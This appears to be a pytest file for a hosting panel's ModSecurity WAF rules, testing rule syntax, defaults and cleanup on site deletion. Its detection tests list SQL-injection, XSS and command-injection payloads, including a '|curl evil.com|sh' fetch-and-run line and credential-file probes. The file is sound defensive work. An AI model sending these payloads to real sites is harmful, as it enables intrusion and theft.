"""The WAF rule set: shape, defaults, and what the patterns actually match.

Two traps are worth guarding permanently. First, a rule written as
``msg:'...'"""  + '"""' + """`` loses its own closing quote to the string
delimiter -- nine of eleven shipped rules had an unterminated action list that
way. Second, an unsaved rule selection means "the defaults", so any group added
with enabled_default False must stay off for the sites that never opened the
WAF page, which on a real server is most of them.
"""
import re

import pytest

from app.services import waf

SHIPPED_BEFORE = {
    "php-sensitive-files",
    "php-path-traversal",
    "php-runtime-probes",
    "laravel-sensitive-files",
    "laravel-ignition-rce",
    "wordpress-sensitive-files",
    "wordpress-xmlrpc-author-scan",
    "wordpress-install-upgrade",
    "wordpress-wp2shell",
}

DIRECTIVE = re.compile(r'^SecRule \S+ "[^\n]*" "[^"\n]*"$')


def _rule(rule_id: str) -> dict:
    return next(rule for rule in waf.DEFAULT_RULES if rule["id"] == rule_id)


def _operand(rule_id: str) -> re.Pattern:
    """The @rx pattern of a rule's first SecRule, compiled."""
    line = _rule(rule_id)["rules"].splitlines()[0]
    body = re.search(r'"@rx (.*)" "id:', line).group(1)
    return re.compile(body)


# --------------------------------------------------------------------------
# Shape
# --------------------------------------------------------------------------

def test_every_rule_line_is_a_closed_secrule_directive():
    for rule in waf.DEFAULT_RULES:
        for line in rule["rules"].splitlines():
            line = line.strip()
            if not line:
                continue
            assert DIRECTIVE.match(line), f"{rule['id']}: {line[-60:]}"


def test_rule_ids_are_unique():
    ids = [rule["id"] for rule in waf.DEFAULT_RULES]
    assert len(ids) == len(set(ids))

    numeric = re.findall(r"id:(\d+)", "\n".join(r["rules"] for r in waf.DEFAULT_RULES))
    assert len(numeric) == len(set(numeric)), "two rules share a ModSecurity id"
    assert waf.BAD_BOT_RULE_ID not in numeric


def test_every_rule_declares_a_phase_and_an_action():
    for rule in waf.DEFAULT_RULES:
        for line in rule["rules"].splitlines():
            if not line.strip():
                continue
            assert re.search(r"phase:[12]", line), rule["id"]
            assert "deny" in line and "status:403" in line, rule["id"]


# --------------------------------------------------------------------------
# Defaults
# --------------------------------------------------------------------------

def test_injection_groups_are_opt_in():
    assert waf._default_enabled_ids().isdisjoint({"sql-injection", "xss"})


def test_an_unsaved_selection_keeps_every_previously_shipped_group():
    # Existing sites store nothing, so this set is what they are running.
    assert SHIPPED_BEFORE <= waf._parse_enabled_rule_ids("")
    assert SHIPPED_BEFORE <= waf._parse_enabled_rule_ids("not json")
    assert SHIPPED_BEFORE <= waf._parse_enabled_rule_ids('{"not": "a list"}')


def test_an_unsaved_selection_renders_no_opt_in_rule():
    content = waf.render_site_rules("example.test", waf._parse_enabled_rule_ids(""))

    assert "id:1001501" not in content   # sql-injection
    assert "id:1001601" not in content   # xss
    assert "id:1001401" in content       # credential files, on by default
    assert "id:1001701" in content       # command injection, on by default


def test_an_admin_can_still_turn_the_opt_in_groups_on():
    content = waf.render_site_rules("example.test", ["sql-injection", "xss"])

    assert "id:1001501" in content
    assert "id:1001601" in content


def test_site_config_reports_the_real_default_not_a_hardcoded_true():
    definitions = {rule["id"]: rule for rule in waf.default_rule_definitions()}

    assert definitions["sql-injection"]["enabled_default"] is False
    assert definitions["generic-sensitive-files"]["enabled_default"] is True


def test_the_dropped_legacy_ids_do_not_resurrect_as_the_new_groups():
    # general-sqli / general-xss were removed on purpose. Mapping them onto the
    # new groups would switch those on for anyone still storing the old ids.
    assert waf.LEGACY_RULE_ID_MAP["general-sqli"] is None
    assert waf.LEGACY_RULE_ID_MAP["general-xss"] is None


# --------------------------------------------------------------------------
# What the new patterns match. Payloads and traffic below were both measured
# against 149,078 real requests before the rules were adopted.
# --------------------------------------------------------------------------

@pytest.mark.parametrize("path", [
    "/.aws/credentials",
    "/.ssh/id_rsa",
    "/id_rsa",
    "/id_rsa.pub",
    "/.npmrc",
    "/.htpasswd",
    "/.DS_Store",
    "/.svn/entries",
    "/backup.sql",
    "/dump.sql.gz",
    "/site.sqlite3",
    "/config.php.bak",
    "/index.php.old",
    "/wp-config.php.save",
    "/style.css~",
])
def test_credential_and_backup_probes_match(path):
    assert _operand("generic-sensitive-files").search(path), path


@pytest.mark.parametrize("path", [
    "/",
    "/index.php",
    "/wp-content/themes/x/style.css",
    "/wp-includes/js/jquery/jquery.min.js",
    "/feed/",
    "/products/ao-so-mi-nam",
    "/wp-json/wp/v2/posts",
    "/assets/app.8f3a2b.js",
    "/images/old-town.jpg",
    "/blog/backup-tips",
])
def test_ordinary_paths_are_not_credential_probes(path):
    assert not _operand("generic-sensitive-files").search(path), path


@pytest.mark.parametrize("query", [
    "?id=1 UNION SELECT a FROM b",
    "?id=1 union all select 1,2",
    "?id=1 or 1=1",
    "?id=sleep(5)",
    "?id=1 AND extractvalue(1,concat(0x7e,user()))",
    "?x=1; drop table users",
])
def test_sql_injection_payloads_match(query):
    assert _operand("sql-injection").search(query), query


@pytest.mark.parametrize("query", [
    "?s=gia re nhat",
    "?p=123&preview=true",
    "?utm_source=facebook&utm_medium=cpc",
    "?orderby=price&order=asc",
    "?s=ao so mi nam gia duoi 500k",
    "?post_type=product&taxonomy=brand",
    "?action=heartbeat&_nonce=abc123",
])
def test_ordinary_queries_are_not_sql_injection(query):
    assert not _operand("sql-injection").search(query), query


@pytest.mark.parametrize("query", [
    "?q=<script>alert(1)</script>",
    "?q=<img src=x onerror=alert(1)>",
    "?next=javascript:alert(1)",
    "?q=<svg onload=alert(1)>",
    "?q=<iframe src=//evil>",
])
def test_xss_payloads_match(query):
    assert _operand("xss").search(query), query


@pytest.mark.parametrize("query", [
    "?s=gia re nhat",
    "?title=Cach lam banh <b>ngon</b>",  # bold is not a script vector here
    "?redirect_to=https://example.com/wp-admin/",
    "?lang=vi&currency=VND",
])
def test_ordinary_queries_are_not_xss(query):
    assert not _operand("xss").search(query), query


@pytest.mark.parametrize("query", [
    "?f=php://input",
    "?f=php://filter/convert.base64-encode/resource=index",
    "?f=data://text/plain;base64,PD9waHA=",
    "?f=phar://x.phar",
    "?c=;cat /etc/passwd",
    "?c=|curl evil.com|sh",
    "?c=$(id)",
])
def test_command_injection_payloads_match(query):
    assert _operand("command-injection").search(query), query


@pytest.mark.parametrize("query", [
    "?url=https://example.com/page",
    "?s=gia re nhat",
    "?redirect=/checkout/",
    "?callback=jQuery21405",
    "?utm_campaign=sale-thang-9",
])
def test_ordinary_queries_are_not_command_injection(query):
    assert not _operand("command-injection").search(query), query


# --------------------------------------------------------------------------
# Housekeeping: a deleted site must not leave its rules behind
# --------------------------------------------------------------------------

def test_deleting_a_vhost_also_removes_its_waf_rules():
    from pathlib import Path

    helper = (Path(__file__).resolve().parents[3]
              / "installer" / "files" / "opanel-helper.sh").read_text(encoding="utf-8")
    start = helper.index("  ols-vhost-delete)")
    block = helper[start:helper.index("  # ---- ClamAV", start)]

    assert 'rm -f "/usr/local/lsws/conf/opanel/waf/sites/${safe_domain}.conf"' in block


def test_the_updater_clears_rule_files_left_by_earlier_deletes():
    from pathlib import Path

    updater = (Path(__file__).resolve().parents[3]
               / "installer" / "update.sh").read_text(encoding="utf-8")
    start = updater.index('WAF_SITES_DIR="/usr/local/lsws/conf/opanel/waf/sites"')
    block = updater[start:updater.index("update_progress 62", start)]

    # It may only delete a rules file whose vhost directory is gone.
    assert 'if [[ -n "$rules_domain" && ! -d "$OLS_VHOSTS_DIR_CLEAN/$rules_domain" ]]' in block
    assert "rm -rf" not in block
